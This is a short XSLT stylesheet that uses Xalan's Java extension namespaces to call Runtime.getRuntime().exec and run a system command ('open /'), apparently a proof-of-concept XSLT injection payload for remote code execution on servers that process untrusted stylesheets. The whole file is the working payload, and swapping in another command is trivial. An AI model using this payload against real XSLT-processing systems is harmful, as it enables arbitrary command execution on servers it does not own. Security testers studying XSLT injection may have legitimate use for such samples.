<?xml version="1.0" encoding="UTF-8" ?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                version="1.0" xmlns:runtime="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:process="http://xml.apache.org/xalan/java/java.lang.Process">
    <xsl:template match="/">
        <html>
            <body>
                <xsl:variable name="rtobject" select="runtime:getRuntime()"/>
                <xsl:variable name="process" select="runtime:exec($rtobject, 'open /')"/>
                <xsl:variable name="waiting" select="process:waitFor($process)"/>
                <xsl:value-of select="$process"/>
            </body>
        </html>
    </xsl:template>
</xsl:stylesheet>